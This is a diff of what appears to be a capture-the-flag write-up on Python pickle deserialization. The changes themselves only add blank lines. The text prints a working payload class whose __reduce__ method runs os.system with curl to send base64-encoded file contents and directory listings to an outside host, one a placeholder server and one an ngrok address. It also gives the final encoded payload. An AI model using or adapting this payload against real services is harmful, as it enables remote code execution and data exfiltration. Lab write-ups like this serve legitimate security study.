@@ -55,6 +55,7 @@ class RCE:
                 return (os.system, ("curl http://YOUR-SERVER/flag=$(cat ../flag.txt | base64)",))
 
 payload = base64.b64encode(pickle.dumps(RCE())).decode() 
+
 print(payload)
 
 Here is how it works:
@@ -82,11 +83,13 @@ $( {command} | base64) would give the full result without making anything comple
 so the payload I we will be using is this:
 
 import pickle, base64, os 
+
 class RCE: 
 	def __reduce__(self): 
 		return (os.system, ("curl https://coriaceous-fungistatic-lillian.ngrok-free.dev/x=$(ls ../ | base64 )",))
 
 payload = base64.b64encode(pickle.dumps(RCE())).decode() 
+
 print(payload)
 
 Running the payload gives: gASVawAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFBjdXJsIGh0dHBzOi8vY29yaWFjZW91cy1mdW5naXN0YXRpYy1saWxsaWFuLm5ncm9rLWZyZWUuZGV2L3g9JChscyAuLi8gfCBiYXNlNjQgKZSFlFKULg==
